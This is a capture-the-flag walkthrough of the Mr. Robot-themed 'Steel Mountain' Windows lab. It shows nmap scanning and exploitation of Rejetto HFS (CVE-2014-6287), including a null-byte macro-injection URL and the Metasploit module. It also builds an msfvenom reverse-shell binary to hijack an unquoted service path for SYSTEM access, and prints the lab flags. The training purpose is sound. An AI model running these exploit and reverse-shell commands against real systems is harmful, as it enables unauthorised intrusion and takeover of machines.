<aside> <img src="/icons/copy_green.svg" alt="/icons/copy_green.svg" width="40px" />

**Steel Mountain**Premium room

Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.

</aside>

# Introduction

## Who is employee of the month?

1. Access the webserver using the IP address

![image.png](attachment:47f276ad-aef6-4add-a084-0239745a4041:image.png)

1. A person of interest will be displayed on the landing page defined as “Employee of the Month”
2. Lets view the source code of the webpage to identify some details of the image

![image.png](attachment:9ce345dc-20f1-42ca-9eec-4c1ace7e21d4:image.png)

1. The image is labelled as BillHarper.png, so that probably means the name of the person is Bill Harper

![image.png](attachment:b192efc6-3f34-4886-b2ec-a0e10900021b:image.png)

# Initial Access

## What is the other port running a web server on?

### Nmap Scan 1

```bash
┌──(root㉿kali)-[~]
└─# nmap 10.10.169.46
Starting Nmap 7.93 ( <https://nmap.org> ) at 2025-10-11 05:07 UTC
Nmap scan report for ip-10-10-169-46.eu-west-1.compute.internal (10.10.169.46)
Host is up (0.00086s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
8080/tcp  open  http-proxy
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49163/tcp open  unknown
MAC Address: 02:BF:95:05:90:B3 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 5.43 seconds

```

### Nmap Scan 2

```bash
┌──(root㉿kali)-[~]
└─# nmap -p- 10.10.169.46 -sV
Starting Nmap 7.93 ( <https://nmap.org> ) at 2025-10-11 05:10 UTC
Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 46.67% done; ETC: 05:11 (0:00:24 remaining)
Nmap scan report for ip-10-10-169-46.eu-west-1.compute.internal (10.10.169.46)
Host is up (0.0041s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8080/tcp  open  http               HttpFileServer httpd 2.3
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
49164/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 02:BF:95:05:90:B3 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 94.69 seconds
```

![image.png](attachment:6a5fa680-a8e3-41b8-90bb-4e244acae244:image.png)

## Take a look at the other web server. What file server is running?

1. Browse to: [http://10.10.169.46:8080/](http://10.10.169.46:8080/)

![image.png](attachment:19878953-8b4e-4acc-bf1a-88a4fd5517cb:image.png)

After browsing the link or viewing the path, the file server that is running seems to be

```bash
Rejetto HTTP File Server
```

![image.png](attachment:5ba7e191-b5da-418f-9e90-c59b0f1623c8:image.png)

## What is the CVE number to exploit this file server?

### Method 1: Quick search on google we can find this easily

![image.png](attachment:67e2d409-ef29-4e23-a758-7f6cc33b5235:image.png)

### Method 2: Using Searchsploit

- Specific search using the -s flag

```bash
┌──(root㉿kali)-[~]
└─# searchsploit -s rejetto http file server
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                         | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                              | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                 | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                            | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                            | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                       | windows/webapps/34852.txt
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                    | windows/webapps/49125.py
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Viewing the contents of the exploit

```bash
searchsploit -x windows/remote/34668.txt
```

Output:

```bash
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 11-09-2014
# Remote: Yes
# Exploit Author: Daniele Linguaglossa
# Vendor Homepage: <http://rejetto.com/>
# Software Link: <http://sourceforge.net/projects/hfs/>
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287

issue exists due to a poor regex in the file ParserLib.pas

function findMacroMarker(s:string; ofs:integer=1):integer;
begin result:=reMatch(s, '\\{[.:]|[.:]\\}|\\|', 'm!', ofs) end;

it will not handle null byte so a request to

<http://localhost:80/?search=%00{.exec|cmd.}>

will stop regex from parse macro , and macro will be executed and remote code injection happen.

## EDB Note: This vulnerability will run the payload multiple times simultaneously.
##   Make sure to take this into consideration when crafting your payload (and/or listener).
/usr/share/exploitdb/exploits/windows/remote/34668.txt (END)

```

- If we look at the CVE Section, we will see the CVE number attached to this exploit

---

## Use Metasploit to get an initial shell. What is the user flag?

### Open MSFConsole

```bash
msfconsole -q
```

### Search for Rejetto

```bash
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > 
```

### Select and insert the options for the exploit

- RHOSTS — The IP address of the victim at which we want to target
- RPORT —It is the port to which we want to listen, as discovered by nmap’s scan, and we can modify it to port 8080
- SRVPORT — We can change it to another port that will not affect us.
- LHOST — It’s our own machine, and telling it where to start and listening
- LPORT — Our personal listening port

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.169.46
RHOSTS => 10.10.169.46
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > set SRVPORT 9090
SRVPORT => 9090
msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST localhost
LHOST => localhost
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

```

### Post Exploit - Finding the User Flag

```bash
meterpreter > cd Desktop
meterpreter > dir
Listing: C:\\Users\\bill\\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-09-27 11:07:07 +0000  desktop.ini
100666/rw-rw-rw-  70    fil   2019-09-27 12:42:38 +0000  user.txt

meterpreter > cat user.txt
��b04763b6fcf51fcd7c13abc7db4fd365
```

---

# Privilege Escalation

Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!

To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "_PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations._"

You can download the script [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1).  If you want to download it via the command line, be careful not to download the GitHub page instead of the raw script. Now you can use the **upload** command in Metasploit to upload the script.

## Downloaded the PowerUp Tool

![image.png](attachment:919ccb68-bbfb-4d73-b1af-317809495b7e:image.png)

## Upload the tool to the Meterpreter Session

![image.png](attachment:ab6229c3-9de9-4a05-aadd-1a387981edba:image.png)

## Executing the Script in to the Meterpreter Session

1. Load the powershell module into the meterpreter session
2. Then Enter Powershell

```bash
load powershell

powershell_shell
```

1. Execute the Script

```bash
. .\\PowerUp.ps1

Involve-AllChecks
```

- Output
    
    ```bash
    meterpreter > upload /root/TOOLS/PowerUp.ps1
    [*] uploading  : /root/TOOLS/PowerUp.ps1 -> PowerUp.ps1
    [*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /root/TOOLS/PowerUp.ps1 -> PowerUp.ps1
    [*] uploaded   : /root/TOOLS/PowerUp.ps1 -> PowerUp.ps1
    meterpreter > dir
    Listing: C:\\Users\\Bill\\Desktop
    ==============================
    
    Mode              Size    Type  Last modified              Name
    ----              ----    ----  -------------              ----
    100666/rw-rw-rw-  600580  fil   2025-10-11 06:32:14 +0000  PowerUp.ps1
    100666/rw-rw-rw-  282     fil   2019-09-27 11:07:07 +0000  desktop.ini
    100666/rw-rw-rw-  70      fil   2019-09-27 12:42:38 +0000  user.txt
    
    meterpreter > load powershell
    Loading extension powershell...Success.
    meterpreter > powershell_shell
    PS > . ./PowerUp.ps1
    PS > Invoke-AllChecks
    
    ServiceName    : AdvancedSystemCareService9
    Path           : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe
    ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubdirectory}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
    CanRestart     : True
    Name           : AdvancedSystemCareService9
    Check          : Unquoted Service Paths
    ```
    

## Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an _unquoted service path_ vulnerability?

![image.png](attachment:fc1b66b5-c1bb-4ec2-99f3-f029c6b691d1:image.png)

```bash
ServiceName    : AdvancedSystemCareService9
Path           : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

```

The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

## What is the root flag?

Use msfvenom to generate a reverse shell as an Windows executable.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.122.222 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.

1. Replace the following file

```bash
C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe
```

1. Navigate to the service directory on the target machine (In Meterpreter

```bash
cd 'C:\\Program Files (x86)\\IObit\\'

meterpreter > dir
Listing: C:\\Program Files (x86)\\IObit
=====================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  32768  dir   2025-10-11 04:59:32 +0000  Advanced SystemCare
040777/rwxrwxrwx  16384  dir   2019-09-27 05:35:24 +0000  IObit Uninstaller
040777/rwxrwxrwx  4096   dir   2019-09-26 15:18:50 +0000  LiveUpdate
```

1. Upload the generated payload to this directory

```bash
meterpreter > upload /root/TOOLS/Advanced.exe
[*] uploading  : /root/TOOLS/Advanced.exe -> Advanced.exe
[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /root/TOOLS/Advanced.exe -> Advanced.exe
[*] uploaded   : /root/TOOLS/Advanced.exe -> Advanced.exe
```

1. Load Powershell

```bash
meterpreter > powershell_shell
PS > 
```

1. Start a Netcat Listener

```bash
nc -nvlp 4443
```

1. Return to the meterpreter shell and follow the steps below once the netcat has been launched as shown in the image above:
    
    ```bash
    shell
    ```
    
    ```bash
    sc stop AdvancedSystemCareService9
    ```
    
    ```bash
    sc start AdvancedSystemCareService9
    ```
    
    - After starting the service again, a shell will be created
2. Complete
    

![image.png](attachment:7de83329-a41a-4547-bbe1-76d8a0ccc3ee:image.png)

1. Recon the new shell and find the root.txt flag

![image.png](attachment:93f1fa3a-afd4-42c7-8c9d-b034db852ff4:image.png)

```bash
9af5f314f57607c00fd09803a587db80
```

---

# Access and Escalation Without Metasploit

Now let's complete the room without the use of Metasploit.

For this we will utilise powershell and winPEAS to enumerate the system and collect the relevant information to escalate to

## Answer the questions below

To begin we shall be using the same CVE. However, this time let's use this [exploit.](https://www.exploit-db.com/exploits/39161)

- Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!*
- You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!

1. To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from [GitHub](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)!